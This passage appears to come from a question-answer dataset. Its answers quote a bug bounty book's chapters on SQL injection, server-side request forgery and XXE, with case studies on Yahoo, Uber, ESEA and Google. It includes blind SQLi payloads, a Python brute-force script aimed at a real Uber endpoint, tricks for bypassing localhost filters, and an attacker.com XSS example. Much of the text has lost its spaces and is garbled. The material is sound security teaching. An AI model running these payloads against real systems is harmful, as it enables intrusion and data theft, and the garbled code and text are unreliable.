from\nthisistobeonthelookoutforopportunitiestoalterthestructureofinputpassed\nto a site. So, where a URL takes ?name as a parameter, trying passing an array\nlike ?name[] to see how the site handles it. It may not result in SQLi, but could\nleadtootherinterestingbehaviour.\nSQLInjection 82\n2. Yahoo Sports Blind SQL\nDifficulty: Medium\nUrl: sports.yahoo.com\nReport Link: esevece tumblr2\nDate Reported: February 16, 2014\nBounty Paid: $3,705\nDescription:\nAccording to his blog, Stefano found a SQLi vulnerability thanks to the year parameter\nin http://sports.yahoo.com/nfl/draft?year=2010&type=20&round=2. From his post,\nhere is an example of a valid response to the Url:\nYahooValidResponse\nNow,interestingly,whenStefanoaddedtwodashes,–,tothequery.Theresultschanged:\n2https://esevece.tumblr.com\nSQLInjection 83\nYahooValidResponse\nThereasonforthisis,the–actascommentsinthequery,asIdetailedabove.So,where\nYahoo’s original query might have looked something like:\nSELECT*FROMPLAYERSWHEREYEAR=2010ANDTYPE=20ANDROUND=2;\nBy inserting the dashes, Stefano essentially made it act like:\nSELECT*FROMPLAYERSWHEREYEAR=2010;\nRecognizing this, it was possible to begin pulling out database information from Yahoo.\nFor example, Stefano was able to check the major version number of the database\nsoftware with the following:\nSQLInjection 84\nYahooDatabaseVersion\nUsing the IF function, players would be returned if the first character from the version()\nfunction was 5. The IF function takes a condition and will return the value after it if the\ncondition is true and the last parameter if it is false. So, based on the picture above, the\nconditionwasthefirstcharacterintheversion.Asaresult,weknowthedatabaseversion\nisnot5sincenoresultsarereturned(besuretocheckouttheMySQLcheatsheetinthe\nResources page for additional functionality when testing SQLi).\nThe reason this is considered a blind SQLi is because Stefano can’t see the direct\nresults;hecan’tjustprintoutthedatabaseversionsinceYahooisonlyreturningplayers.\nHowever, by manipulating the query and comparing the results against the result of\nthe baseline query (the first image), he would have been able to continue extracting\ninformation from the Yahoo database.\nTakeaways\nSQLi, like other injection vulnerabilities, isn’t overly tough to exploit. The key is\nto test parameters which could be vulnerable. In this case, adding the double\ndash clearly changed the results of Stefano’s baseline query which gave away\ntheSQLi.Whensearchingforsimilarvulnerabilities,beonthelookoutforsubtle\nchangestoresultsastheycanbeindicativeofablindSQLivulnerability.\nSQLInjection 85\n3. Uber Blind SQLi\nDifficulty: Medium\nUrl: http://sctrack.email.uber.com.cn/track/unsubscribe.do\nReport Link: https://hackerone.com/reports/1501563\nDate Reported: July 18, 2016\nBounty Paid: $4000\nDescription:\nInadditiontowebpages,blindSQLinjectionscanbeachievedthroughotherroutessuch\nas email links. In July 2016, Orange Tsai received an email advertisement from Uber. He\nnoticedthattheunsubscribelinkincludedabase64encodedstringasaURLparameter.\nThe link looked like:\nhttp://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUi\\\nLCAicmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ9\nDecoding the p parameter value eyJ1c2VyX2lkIjogIjU3NTUiLCAi￿ using base64 returns\nthe JSON string {\"user_id\":\"5755\",\"receiver\":\"orange@mymail\"}. Once Orange had the de-\ncoded string, he added the code and sleep(12) = 1 to the encoded p URL parameter,\nwhich is a harmless injection designed to make the database take longer to respond to\ntheunsubscribeaction{\"user_id\":\"5755andsleep(12)=1\",\"receiver\":\"orange@mymail\"}.Ifasite\nis vulnerable, the query execution evaluates sleep(12) and performs no action for 12\nseconds before comparing the output of the sleep command to 1. In MySQL, the sleep\ncommand normally returns 0, so this comparison will fail, but this doesn’t matter since\nthe execution will take at least 12 seconds.\nAfter Orange re-encoded the modified payload and passed the payload to the URL\nparameter,hevisitedtheunsubscribelinktoconfirmtheHTTPresponsetookatleast12\nseconds. However, Orange decided he needed more concrete proof of the SQLi to send\nto Uber, so he decided to dump the user name, host name, and name of the database\nusing brute force since it demonstrated the ability to extract information from a SQLi\nwithout accessing confidential data.\nSQL has a function called user that returns the user name and host name of a database\nintheform<user>@<host>.BecauseOrangewasn’tabletoaccessoutputfromhisinjected\nqueries, he couldn’t simply call user. Instead, Orange modified his query to add a\nconditional check when the query looked up his user ID, comparing one character of\nthedatabase’susernameandhostnamestringatatimeusingthemidfunction.Similar\ntotheYahooSportsblindSQLifromthepreviousbugreport,Orangeusedacomparison\nstatement to derive each character of the user name and host name string.\n3https://hackerone.com/reports/150156\nSQLInjection 86\nFor example, to find a user name and host name using a comparison statement and\nbruteforce,Orangetookthefirstcharacterofthevaluereturnedfromtheuserfunction\nusing the mid function and compared whether the character was equal to ‘a’, then ‘b’,\nthen ‘c’, and so on. If the comparison statement were true, the server would execute\nthe unsubscribe command indicating that the first character of the user functionâ￿￿s\nreturnvalueisequaltothecharacteritisbeingcomparedto.Otherwise,ifthestatement\nwerefalse,theserverwouldnotattempttounsubscribehim.Bycheckingeachcharacter\noftheuserfunction’sreturnvaluewiththismethod,Orangewouldeventuallybeableto\nderive the entire user name and host name.\nManually brute forcing a string would take time, so Orange created a Python script that\nwould create and submit payloads to Uber on his behalf as follows:\nimportjson\nimportstring\nimportrequests\nfromurllibimportquote\nfrombase64importb64encode\nbase=string.digits+string.letters+'_-@.'\npayload={\"user_id\":5755,\"receiver\":\"blog.orange.tw\"}\nforlinrange(0,30):\nforiinbase:\npayload['user_id']=\"5755andmid(user(),%d,1)='%c'#\"%(l+1,i)\nnew_payload=json.dumps(payload)\nnew_payload=b64encode(new_payload)\nr=requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?\\\np='+quote(new_payload))\niflen(r.content)>0:\nprinti,\nbreak\nThe Python code begins with five lines of import statements that retrieve the libraries\nOrange needs to process HTTP requests, JSON, and string encodings.\nAdatabaseusernameandhostnamecanbemadeupofanycombinationofuppercase\nletters,lowercaseletters,numbers,hyphens(-),underscores(_),atmarks(@),orperiods\n(.).Orangecreatesthebasevariabletoholdthesecharacters.Nexthecreatesavariable\nto hold the payload that the script sends to the server. The first line inside of the foriin\nbase is the actual injection, which is constructed using the for loops.\nI’llwalkyouthroughthecode.OrangereferenceshisuserID,5755,withthestringuser_id\nas defined in the payload variable to create his payloads. He uses the mid function and\nstringprocessingtoconstructapayloadsimilartotheYahoobugfromthischapter.The\nSQLInjection 87\n%d and %c in the payload are string replacement placeholders. The %d is used for data\nrepresenting a digit and the %c for character data.\nThe payload string starts at the double quotes (“) and ends at the second pair of\ndouble quotes before the third percent symbol. The third percent symbol tells Python\nto replace the %d and %c placeholders with the values following the percent symbol in\nthe parentheses. This means that the code replaces %d with l+1 (the variable l plus the\nnumber 1) and %c with the variable i. The hash (#) is another way of commenting in\nMySQL and renders any part of the query following Orange’s injection into a comment.\nThe l and i variables are the loop iterators. The first time we enter l in range (0,30), l will\nbe 0. The value of l is the position in the user name and host name string returned by\nthe user function that the script is trying to brute force. Once the script has a position\nin the user name and host name string it is testing, we enter a nested loop that iterates\novereachcharacterinthebasestring.Thefirsttimethescriptiteratesthroughboththe\nloops,lwillbe0andiwillbea.Thesevaluesarepassedtothemidfunctiontocreatethe\npayload \"5755andmid(user(),0,1)='a'#\".\nIn the next iteration of the nested for loop, the value of l will still be 0 and i will be b to\ncreatethepayload\"5755andmid(user(),0,1)='b'#\".Thepositionlwillremainconstantasthe\nloop iterates though each character in base to create the payload.\nEach time a new payload is created, the code converts the payload to JSON, re-encodes\nthe string using the base64encode function, and sends the HTTP request to the server.\nThecodechecksiftheserverrespondsbackwithamessage.Ifthecharacterinimatches\nthe username substring at the position being tested, the script stops testing characters\nat that position and moves on to the next position in the user string. The nested loop\nbreaks and returns to the loop, which increments l by 1 to test the next position of the\nusername string.\nThis proof of concept allowed Orange to confirm the database user name and host\nname was sendcloud_w@10.9.79.210 and the database name was sendcloud (to obtain the\ndatabase name, replace user with database). In response to the report, Uber confirmed\nthattheSQLinjectionhadn’toccurredontheirserver.Theinjectionoccurredonathird-\nparty Uber was using, but they still paid a reward. Not all bounty programs will do\nthe same if a vulnerable service isn’t their own. Uber likely paid a bounty because the\nexploitwouldallowanattackertodumpallofUber’scustomeremailaddressesfromthe\nsendcloud database.\nWhileyoucanwriteyourownscriptsasOrangedidtodumpdatabaseinformationfrom\navulnerablewebsite,youcouldalsouseautomatedtools.TheResourceschapterofthis\nbook includes information on SQLMap, one such tool.\nSQLInjection 88\nTakeaways\nKeep an eye out for HTTP requests that accept encoded parameters. After you\ndecodeandinjectyourqueryintoarequest,besuretore-encodeyourpayload\nsoeverythingstillmatchestheencodingthedatabaseisexpecting.\nExtracting a database name, user name and host name is generally considered\nharmless,butbesureit’swithinthepermittedactionsofthebountiesprogram\nyou’re working in. In some cases, the sleep command is enough for a proof of\nconcept.\nSummary\nSQLi can be a significant vulnerability and dangerous for a site. If an attacker were to\nfind a SQLi, they might be able to obtain full permissions to a site. In some situations,\na SQLi can be escalated by inserting data into the database that enables administrative\npermissionsonthesite,asintheDrupalexample.WhenlookingforSQLivulnerabilities,\nkeep an eye out for places where you can pass unescaped single or double quotes to\na query. When you find a vulnerability, the indications that the vulnerability exists can\nbe subtle, such as with blind injections. You should also look for places where you can\npass data to a site in unexpected ways, such as places where you can substitute array\nparameters in request data like in the Uber bug."
  },
  {
    "input": "What is Server Side Request Forgery (SSRF) and how can it be exploited to access internal systems or retrieve sensitive information?",
    "summary": "Server-side request forgery (SSRF) allows attackers to make a server perform unintended network requests, often exposing internal information or enabling access to external servers. Attackers can exploit SSRF by manipulating URLs or IP addresses to trigger requests that reveal sensitive data or allow further attacks, such as XSS or DNS queries. Examples include exploiting vulnerabilities to access internal servers or using DNS requests to gather information about a system's network.",
    "output": "12. Server Side Request Forgery\nDescription\nServer-siderequestforgery,orSSRF,isavulnerabilitywhereanattackerisabletomakea\nserverperformunintendednetworkrequests.SSRFsaresimilartoCSRFwithonenotable\ndifference.WhilethevictimofaCSRFattackisauser,theSSRFvictimisthewebsiteitself.\nLikewithCSRF,SSRFvulnerabilitiescanvaryinimpactandmethodsofexecution.Inthis\nbook, we’ll focus on HTTP requests, but SSRF can also exploit other types of protocols.\nHTTP Request Location\nDepending on how the website is organized, a server vulnerable to SSRF may be able to\nmake an HTTP request to an internal network or to external addresses. The vulnerable\nserver’s ability to make requests will determine what you can do with the SSRF.\nSomelargerwebsiteshavefirewallsthatprohibitexternalinternettrafficfromaccessing\ninternal servers, for example, the website will have a limited number of publicly facing\nservers that receive HTTP requests from visitors and send requests onto other servers\nthatarepubliclyinaccessible.Acommonexampleofthisaredatabaseservers,whichare\noften inaccessible to the internet. When logging into a site like this, you might submit a\nusername and password through a regular web form. The website would receive your\nHTTPrequestandperformitsownrequesttothedatabaseserverwithyourcredentials,\nthen the database server would respond to the web application server, and the web\napplicationserverwouldrelaytheinformationtoyou.Duringthisprocess,youoftenare\nnot aware the remote database server exists and you should have no direct access to\nthe database.\nVulnerable servers that allow attackers to control requests to internal servers may\nexpose private information. For example, an SSRF on the previous database example\nmightallowanattackertosendrequeststothedatabaseserverandretrieveinformation\ntheyshouldn’thaveaccessto.SSRFvulnerabilitiesprovideattackersaccesstoabroader\nnetwork to target.\nIf you find an SSRF, but the vulnerable site doesn’t have internal servers or they aren’t\naccessible via the vulnerability, the next best thing to check for is whether you can\nperform requests to arbitrary external sites from the vulnerable server. If the target\nserver can be exploited to communicate with a server you control, you can use the\nrequested information from it to learn more about the software being used and you\nmight be able to control the response to it.\nServerSideRequestForgery 90\nFor example, you might be able to convert external requests to internal requests if the\nvulnerable server will follow redirects, a trick Justin Kennedy (@jstnkndy) pointed out\nto me. In cases where a site won’t allow access to internal IPs, but will contact external\nsites,youcanreturnaHTTPresponsewithastatuscodeof301,whichisaredirect.Since\nyou control the response, you can point the redirection to an internal IP address to test\nwhethertheserverwillfollowthe301andmakeanHTTPrequesttoitsinternalnetwork.\nTheleastexcitingsituationiswhenanSSRFvulnerabilityonlyallowsyoutocommunicate\nwith a limited number of external websites. In those cases, you might be able to take\nadvantage of an incorrectly configured blacklist. For example, if a website is meant to\ncommunicate externally with leanpub.com, but is only validating that the URL provided\nends in leanpub.com, an attacker could register attackerleanpub.com. This would allow\nan attacker to control a response back to the victim site.\nInvoking GET Versus POST Requests\nOnce you confirm a SSRF can be submitted, you should confirm what type of HTTP\nmethod can be invoked to exploit the site: GET or POST. POST requests may be more\nsignificant because they may invoke state changing behavior if POST parameters can be\ncontrolled. State changing behavior could be creating user accounts, invoking system\ncommandsorexecutingarbitrarycodedependingonwhattheservercancommunicate\nwith. GET requests on the other hand are often associated with exfiltrating data.\nBlind SSRFs\nAfter confirming where and how you can make a request, the next thing to consider is\nwhether you can access the response of a request. When you can’t access a response,\nyouhaveablindSSRF.Forexample,anattackermighthaveaccesstoaninternalnetwork\nthrough SSRF, but can’t read HTTP responses to the internal server requests. Because\nthe attacker can’t read the responses, they will need to find an alternative means of\nextracting information. There are two common ways of doing so: timing and DNS.\nIn some blind SSRFs, response times may reveal information about the servers being\ninteracted with. One way of exploiting this, is to port scan inaccessible servers. Ports\nprovidetheabilitytopassinformationinandoutofaserver.Youscanportsonaserver\nbysendingarequestandseeingwhethertheyrespond.Forexample,ifyouareexploiting\naSSRFtoaninternalnetworkbyportscanningthoseservers,aresponsethatreturnsin\n1 second vs 10 seconds could indicate whether it’s open, closed or filtered depending\non how known ports (like 80 or 443) respond. Filtered ports are like a communication\nblackhole.Theydon’treplytorequestssoyou’llneverknowiftheyareopenorclosed.In\ncontrast,aquickreplymightmeanthattheserverisopenandacceptingcommunication\nor is closed and not accepting communication. When exploiting SSRF for port scanning,\nyoushouldtryconnectingtocommonportslike22(usedforSSH),80(HTTP),443(HTTPS),\nServerSideRequestForgery 91\n8080 (alternate HTTP), and 8443 (alternate HTTPS) to confirm whether responses differ\nand what information you can deduce from that.\nDNS is used as a map for the internet. If you’re able to invoke DNS requests using the\ninternal systems and can control the address of the request, including the subdomain,\nyoumightbeabletosmuggleinformationoutofotherwiseblindSSRFvulnerabilities.To\nexploitthis,youappendthesmuggledinformationasasubdomaintoyourowndomain\nand the targeted server performs a DNS lookup to your site for that subdomain. For\nexample,if you finda blind SSRF andare able toexecute limited commands ona server\nbut not read any responses, if you can invoke DNS lookups while controlling the lookup\ndomain, using the command whoami and adding its output as a subdomain would send\na request to your server, your server will receive a DNS lookup for data.yourdomain.com,\nwhere data is the out from the vulnerable server’s whoami command.\nLeveraging SSRF\nWhen you’re not able to target internal systems, you can instead try to exploit SSRFs\nthat impact users. If your SSRF isn’t blind, one way of doing this is to return an XSS\npayload to the SSRF request, which is executed on the vulnerable site. Stored XSS\npayloads are especially significant if they are easily accessed by other users since\nyou could exploit this to attack them. For example, supposed www.leanpub.com ac-\ncepted a URL to fetch an image for your profile image, www.leanpub.com/picture?url=\n. You could submit a URL to your own site which returned a HTML page with a XSS\npayload, www.leanpub.com/picture?url=attacker.com/xss. If www.leanpub.com saved\nthe HTML and rendered it for the image, there would be a stored XSS vulnerability.\nHowever, if Leanpub rendered the HTML with the XSS but didn’t save it, you could test\nwhether they prevented CSRF for that action. If they didn’t, you could share the URL,\nwww.leanpub.com/picture?url=attacker.com/xsswithatargetandiftheyvisitedthelink,\nthe XSS would fire as a result of the SSRF to your site.\nWhen looking for SSRF vulnerabilities, keep an eye out for opportunities where you are\nallowed to submit a URL or IP address as part of some site functionality and consider\nhow you could leverage the behavior to either communicate with internal systems or\ncombine this with some other type of malicious behavior.\nExamples\n1. ESEA SSRF and Querying AWS Metadata\nDifficulty: medium\nUrl: https://play.esea.net/global/media_preview.php?url=\nServerSideRequestForgery 92\nReportLink:http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-query-\ning-aws-meta-data/1\nDate Reported: April 18, 2016\nBounty Paid: $1000\nDescription:\nE-Sports Entertainment Association (ESEA) is an esports competitive video gaming com-\nmunity founded by E-Sports Entertainment Association (ESEA). Recently they started a\nbug bounty program of which Brett Buerhaus found a nice SSRF vulnerability on.\nUsing Google Dorking, Brett searched for site:https://play.esea.net/ ext:php. This\nleveragesGoogletosearchthedomainof play.esea.netforPHPfiles.Thequeryresults\nincluded https://play.esea.net/global/media_preview.php?url=.\nLooking at the URL, it seems as though ESEA may be rendering content from external\nsites. This is a red flag when looking for SSRF. As he described, Brett tried his own do-\nmain: https://play.esea.net/global/media_preview.php?url=http://ziot.org. But no\nluck.Turnsout,eseawaslookingforimagefilessohetriedapayloadincludinganimage,\nfirst using Google as the domain, then his own, https://play.esea.net/global/media_-\npreview.php?url=http://ziot.org/1.png.\nSuccess.\nNow, the real vulnerability here lies in tricking a server into rendering content other\nthan the intended images. In his post, Brett details typical tricks like using a null\nbyte (%00), additional forward slashes and question marks to bypass or trick the back\nend. In his case, he added a ? to the url: https://play.esea.net/global/media_pre-\nview.php?url=http://ziot.org/?1.png.\nWhatthisdoesisconvertthepreviousfilepath,1.pngtoaparameterandnotpartofthe\nactual url being rendered. As a result, ESEA rendered his webpage. In other words, he\nbypassed the extension check from the first test.\nNow, here, you could try to execute a XSS payload, as he describes. Just create a simple\nHTML page with Javascript, get the site to render it and that’s all. But he went further.\nWith input from Ben Sadeghipour (remember him from Hacking Pro Tips Interview #1\non my YouTube channel), he tested out querying for AWS EC2 instance metadata.\nEC2isAmazon’sElasticComputeCloud,orcloudservers.Theyprovidetheabilitytoquery\nthemselves, via their IP, to pull metadata about the instance. This privilege is obviously\nlockeddowntotheinstanceitselfbutsinceBretthadtheabilitytocontrolwhattheserver\nwasloadingcontentfrom,hecouldgetittomakethecalltoitselfandpullthemetadata.\nThedocumentationforec2ishere:http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-\ninstance-metadata.html. Theres some pretty sensitive info you can grab.\n1http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/\nServerSideRequestForgery 93\nTakeaways\nGoogleDorkingisagreat toolwhichwillsave youtimewhileexposingall kinds\nofpossibleexploits.Ifyou’relookingforSSRFvulnerabilities,beonthelookout\nforany targeturlswhichappear to bepulling in remotecontent. In thiscase, it\nwastheurl=whichwasthegiveaway.\nSecondly,don’trunoffwiththefirstthoughtyouhave.Brettcouldhavereported\nthe XSS payload which wouldn’t have been as impactful. By digging a little\ndeeper,hewasabletoexposethetruepotentialofthisvulnerability.Butwhen\ndoingso,becarefulnottooverstep.\n2. Google Internal DNS SSRF\nDifficulty: medium\nUrl:https://www.rcesecurity.com/2017/03/ok-google-give-me-all-your-internal-dns-infor-\nmation/\nReportLink:https://www.rcesecurity.com/2017/03/ok-google-give-me-all-your-internal-\ndns-information/2\nDate Reported: January 2017\nBounty Paid: undisclosed\nDescription:\nGoogle provides the site https://toolbox.googleapps.com for users to debug issues they\narehavingwithGoogle’sGSuiteServices.Toolsincludebrowserdebugging,loganalyzers\nandDNSrelatedlookups.ItwastheDNStoolsthatcaughtJulienAhrens’attentionwhen\nbrowsing the site for vulnerabilities (big thanks to him for allowing the inclusion of this\nvulnerability in the book and the use of the images he captured).\nAs part of Google’s DNS tools, they include one called ‘Dig’. This acts much like the\nUnix dig command to query domain name servers for site DNS information. This is the\ninformationthatmapsanIPaddresstoareadabledomainlikewww.google.com.Atthe\ntime of the finding, Google included two input fields, one for the URL and the other for\nthe domain name server as shown in this, courtesy of Julien.\n2https://www.rcesecurity.com/2017/03/ok-google-give-me-all-your-internal-dns-information/\nServerSideRequestForgery 94\nGoogleToolboxInterface\nIt was the “Name server” field that caught Julien’s attention because it allowed users\nto specify an IP address to point the DNS query to. This is significant as it suggested\nthatuserscouldsendDNSqueriestoanyIPaddress,possiblyeveninternetrestrictedIP\naddresses meant for use only in internal private networks. These IP ranges include:\n• 10.0.0.0 - 10.255.255.255\n• 100.64.0.0 - 100.127.255.255\n• 127.0.0.0 - 127.255.255.255\n• 172.16.0.0 - 172.31.255.255\n• 192.0.0.0 - 192.0.0.255\n• 198.18.0.0 - 198.19.255.255\nTobegintestingtheinputfield,Juliensubmittedthecommonlocalhostaddress127.0.0.1\nused to address the server executing the command. Doing so resulted in the error\nmessage, “Server did not respond.”. This implied that the tool was actually trying to\nServerSideRequestForgery 95\nconnect to it’s own port 53, the port used to respond to DNS lookups, for information\nabout his site, rcesecurity.com.\nThis subtle message is crucial because it reveals a potential vulnerability. On larger\nprivate networks, not all servers are internet facing, meaning only specific servers can\nbe access remotely by users. Servers running websites are an example of intentionally\naccessibleinternetservers.However,ifoneoftheserversonanetworkhasbothinternal\nandexternalaccessanditcontainsaSSRFvulnerability,attackersmaybeabletoexploit\nthat server to gain access internal servers. This is what Julien was looking for.\nOn that note, he sent the HTTP request to Burp intruder to begin enumerating internal\nIPaddressesinthe10.range.Afteracoupleminutes,hegotaresponsefromaninternal\n10. IP address (he’s purposely not disclosed which) with an empty A record about his\ndomain.\nid60520\nopcodeQUERY\nrcodeREFUSED\nflagsQRRDRA\n;QUESTION\nwww.rcesecurity.comINA\n;ANSWER\n;AUTHORITY\n;ADDITIONAL\nThe fact that is it empty doesn’t matter since we’d expect an internal DNS server not\nto know anything about his external site. It’s contents are also unimportant for this\nexample.Rather,what’spromisingisthefactthataDNSserverwithinternalaccesswas\nfound.\nThe next step was to retrieve information about Google’s internal network. The best\nway to do so is to find their internal corporate network. This was easily done via a\nquick Google search which turned up a post on ycombinator’s HackerNews referencing\ncorp.google.com. The reason for targeting corp.google.com sub domain is its network\ninformation should be internal and not publicly accessible.\nSo, the next step was to begin brute forcing sub domains for corp.google.com which\nturned up ad.corp.google.com (apparently a Google search would have also turned this\nup). Submitting this sub domain and using the internal IP address, Google returned a\nbunch of private DNS information:\nServerSideRequestForgery 96\nid54403\nopcodeQUERY\nrcodeNOERROR\nflagsQRRDRA\n;QUESTION\nad.corp.google.comINA\n;ANSWER\nad.corp.google.com.58INA100.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA172.REDACTED\nad.corp.google.com.58INA100.REDACTED\n;AUTHORITY\n;ADDITIONAL\nNotethereferencestotheinternalIPaddresses100.and172.Incomparison,thepublic\nDNS lookup for ad.corp.google.com returned the following:\ndigAad.corp.google.com@8.8.8.8\n;<<>>DiG9.8.3-P1<<>>Aad.corp.google.com@8.8.8.8\n;;globaloptions:+cmd\n;;Gotanswer:\n;;->>HEADER<<-opcode:QUERY,status:NXDOMAIN,id:5981\n;;flags:qrrdra;QUERY:1,ANSWER:0,AUTHORITY:1,ADDITIONAL:0\n;;QUESTIONSECTION:\n;ad.corp.google.com. IN A\n;;AUTHORITYSECTION:\ncorp.google.com. 59 IN SOAns3.google.com.dns-admin.google.com.14761569890\\\n0900180060\n;;Querytime:28msec\n;;SERVER:8.8.8.8#53(8.8.8.8)\n;;WHEN:WedFeb1523:56:052017\n;;MSGSIZE rcvd:86"
  },
  {
    "input": "What is Server Side Request Forgery (SSRF) and how can it be exploited to access internal network resources?",
    "summary": "Server-side request forgery (SSRF) occurs when a server is tricked into making requests on behalf of an attacker. This can be exploited if a website allows users to input URLs that the server uses to make external requests. In the case described, the attacker was able to bypass localhost checks and attempt to communicate with internal servers by using different IP addresses and ports, revealing potential vulnerabilities in how the server handles responses.",
    "output": "ServerSideRequestForgery 97\nIt was possible to also obtain the internal name servers for ad.corp.google.com:\nid34583\nopcodeQUERY\nrcodeNOERROR\nflagsQRRDRA\n;QUESTION\nad.corp.google.comINNS\n;ANSWER\nad.corp.google.com.1904INNShot-dcREDACTED\nad.corp.google.com.1904INNShot-dcREDACTED\nad.corp.google.com.1904INNScbf-dcREDACTED\nad.corp.google.com.1904INNSvmgwsREDACTED\nad.corp.google.com.1904INNShot-dcREDACTED\nad.corp.google.com.1904INNSvmgwsREDACTED\nad.corp.google.com.1904INNScbf-dcREDACTED\nad.corp.google.com.1904INNStwd-dcREDACTED\nad.corp.google.com.1904INNScbf-dcREDACTED\nad.corp.google.com.1904INNStwd-dcREDACTED\n;AUTHORITY\n;ADDITIONAL\nLastly, this other sub domains were also accessible, including a minecraft server at\nminecraft.corp.google.com\nTakeaways\nKeepaneyeoutforopportunitieswherewebsitesincludefunctionalitytomake\nexternal HTTP requests. When you come across these, try pointing the request\ninternallyusingtheprivatenetworkIPaddresslistedabove.\nIfthesitewon’taccessinternalIPs,atrickJustinKennedyoncerecommendedto\nmewastomaketheexternalHTTPrequesttoaserveryoucontrolandrespond\ntothatrequestwitha301redirect.Thistypeofresponsetellstherequesterthat\nthelocationfortheresourcetheyhaverequestedhaschangedandpointsthem\ntoanewlocation.Sinceyoucontroltheresponse,youcanpointtheredirection\nto an internal IP address to see the server will then make the HTTP request to\ntheinternalnetwork.\n3. Internal Port Scanning\nDifficulty: Easy\nServerSideRequestForgery 98\nUrl: N/A\nReport Link: N/A\nDate Reported: October 2017\nBounty Paid: undisclosed\nDescription:\nWebhooksareacommonfunctionalitythatallowuserstoaskonesitetosendarequest\nto another remote site when certain actions occur. For example, an e-commerce site\nmight allow users to set up a web hook which sends purchase information to a remote\nsite every time a user submits an order. Web hooks that allow the user to define the\nURLoftheremotesiteprovideanopportunityforSSRFs,buttheimpactofanymightbe\nlimited since you can’t always control the request or access the response.\nInOctober2017,IwastestingasitewhenInoticeditprovidedtheabilitytocreatecustom\nweb hooks. I submitted the web hook URL as http://localhost to see if the server would\ncommunicate with itself. However, the site said this was not permitted, so I also tried\nhttp://127.0.0.1, but this also returned an error message. Undeterred, I tried referencing\n127.0.0.1 in other ways. The IP Address Converter3 lists several alternative IP addresses\nincluding 127.0.1 and 127.1 among many others. Both appeared to work.\nI submitted my report, but the severity of this was too low to warrant a bounty since all\nI had demonstrated was the ability to bypass their localhost check. To be eligible for a\nreward,Ineededtodemonstratetheabilitytocompromisetheirinfrastructureorextract\ninformation.\nThesitealsohadafeaturecalledwebintegrations,whichallowsuserstoimportremote\ncontent to the site. By creating a custom integration, I could provide a remote URL that\nreturns an XML structure for the site to parse and render for my account.\nTostart,Isubmitted127.0.0.1andhopedthesitemightdisclosesomeinformationabout\ntheresponse.Instead,thesiterenderedanerrorinplaceofvalidcontent:500“Unableto\nconnect.” This looked promising because the site was disclosing information about the\nresponse.Next,IcheckedwhetherIcouldcommunicatewithportsontheserver.Iwent\nbacktotheintegrationconfigurationandsubmitted127.0.0.1:443,whichistheIPaddress\nto access and the port on the server separated by a colon. This allowed me to see if the\nsitecouldcommunicateonport443.Again,Igot,500“Unabletoconnect.”Sameforport\n8080.Next, I tried port22, which is commonlyused to connect overSSH. This time Igot\nerror 503, “Could not retrieve all headers.”\nBingo. This response was different and confirmed a connection. “Could not retrieve all\nheaders” was returned because I was sending HTTP traffic to a port expecting the SSH\nprotocol. I resubmitted the report to demonstrate that I could use web integrations\n3https://www.psyon.org/tools/ip_address_converter.php?ip=127.0.0.1\nServerSideRequestForgery 99\nto port scan their internal server since responses were different for open/closed and\nfiltered ports.\nTakeaways\nIfyou’reabletosubmitaURLtocreatewebhooksorintentionallyimportremote\ncontent,trytodefinespecificports.Minorchangesinhowaserverrespondsto\ndifferentportsmayrevealwhetheraportisopen/closedorfiltered.Inaddition\ntodifferencesinthemessagesreturnedbytheserver,portsmayrevealwhether\ntheyareopen/closed,orfilteredthroughhowlongittakestheservertorespond\ntotherequest.\nSummary\nServersiderequestforgeriesoccurwhenaservercanbeleveragedtomakerequestson\nbehalf of an attacker. However, not all requests end up being exploitable. For example,\njustbecauseasiteallowsyoutoprovideaURLtoanimagewhichitwillcopyanduseon\nit’sownsite(liketheESEAexampleabove),doesn’tmeantheserverisvulnerable.Finding\nthat is just the first step after which you will need to confirm what the potential is. With\nregards to ESEA, while the site was looking for image files, it wasn’t validating what it\nreceived and could be used to render malicious XSS as well as make HTTP requests for\nits own EC2 metadata."
  },
  {
    "input": "What is an XML External Entity (XXE) vulnerability and how can it be exploited to access sensitive server files or communicate with a malicious server?",
    "summary": "An XML External Entity (XXE) vulnerability allows attackers to exploit XML parsing by including external entities, such as local files or remote servers, in XML documents. This can lead to unauthorized access to sensitive data or remote code execution if the application does not properly validate XML input. Examples include vulnerabilities in Google, Facebook, and Wikiloc, where attackers were able to read server files or make remote requests by manipulating XML entities. Hackers should be cautious of XML file uploads and test them for XXE vulnerabilities to identify potential security risks.",
    "output": "13. XML External Entity Vulnerability\nDescription\nAn XML External Entity (XXE) vulnerability involves exploiting how an application parses\nXML input, more specifically, exploiting how the application processes the inclusion of\nexternalentitiesincludedintheinput.Togainafullappreciationforhowthisisexploited\nand its potential, I think it’s best for us to first understand what the eXtensible Markup\nLanguage (XML) and external entities are.\nAmetalanguageis alanguage usedfor describingother languages,and that’swhat XML\nis. It was developed after HTML in part, as a response to the shortcomings of HTML,\nwhich is used to define the display of data, focusing on how it should look. In contrast,\nXML is used to define how data is to be structured.\nFor example, in HTML, you have tags like <title>, <h1>, <table>, <p>, etc. all of which are\nused to define how content is to be displayed. The <title> tag is used to define a page’s\ntitle (shocking), <h1> tags refer define headings, <table> tags present data in rows and\ncolumns and <p> are presented as simple text. In contrast, XML has no predefined tags.\nInstead, the person creating the XML document defines their own tags to describe the\ncontent being presented. Here’s an example:\n<?xmlversion=\"1.0\"encoding=\"UTF-8\"?>\n<jobs>\n<job>\n<title>Hacker</title>\n<compensation>1000000</compensation>\n<responsibilityoptional=\"1\">Shottheweb</responsibility>\n</job>\n</jobs>\nReading this, you can probably guess the purpose of the XML document - to present a\njoblistingbutyouhavenoideahowthiswilllookifitwerepresentedonawebpage.The\nfirstlineoftheXMLisadeclarationheaderindicatingtheversionofXMLtobeusedand\ntype of encoding. At the time of writing this, there are two versions of XML, 1.0 and 1.1.\nDetailing the differences between 1.0 and 1.1 is beyond the scope of this book as they\nshould have no impact on your hacking.\nAfter the initial header, the tag <jobs> is included and surrounds all other <job> 